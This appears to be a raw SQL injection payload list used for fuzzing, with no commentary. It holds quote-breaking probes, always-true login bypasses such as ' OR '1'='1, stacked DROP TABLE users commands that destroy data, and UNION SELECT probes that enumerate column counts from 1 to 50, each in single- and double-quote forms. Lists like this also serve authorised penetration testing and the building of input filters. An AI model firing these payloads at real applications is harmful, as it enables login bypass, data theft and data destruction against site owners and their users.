'
"
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
'; DROP TABLE users; --
" OR 1=1; DROP TABLE users; --
' UNION SELECT 1,2,3--
" UNION SELECT 1,2,3--
' AND '1'='1
" AND "1"="1
' AND '1'='2
" AND "1"="2
' OR 'x'='x
" OR "x"="x
' OR 'a'='a
" OR "a"="a
' OR 1=1#
" OR 1=1#
' OR '1'='1'--
" OR "1"="1"--
' OR '1'='1'/*
" OR "1"="1"/*
' OR '1'='1'#
" OR "1"="1"#
' OR 1=1 LIMIT 1--
" OR 1=1 LIMIT 1--
' OR 1=1 ORDER BY 1--
" OR 1=1 ORDER BY 1--
' OR 1=1 GROUP BY 1--
" OR 1=1 GROUP BY 1--
' OR 1=1 HAVING 1=1--
" OR 1=1 HAVING 1=1--
' OR 1=1 UNION SELECT 1--
" OR 1=1 UNION SELECT 1--
' OR 1=1 UNION SELECT 1,2--
" OR 1=1 UNION SELECT 1,2--
' OR 1=1 UNION SELECT 1,2,3--
" OR 1=1 UNION SELECT 1,2,3--
' OR 1=1 UNION SELECT 1,2,3,4--
" OR 1=1 UNION SELECT 1,2,3,4--
' OR 1=1 UNION SELECT 1,2,3,4,5--
" OR 1=1 UNION SELECT 1,2,3,4,5--
' OR 1=1 UNION SELECT 1,2,3,4,5,6--
" OR 1=1 UNION SELECT 1,2,3,4,5,6--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--
" OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--
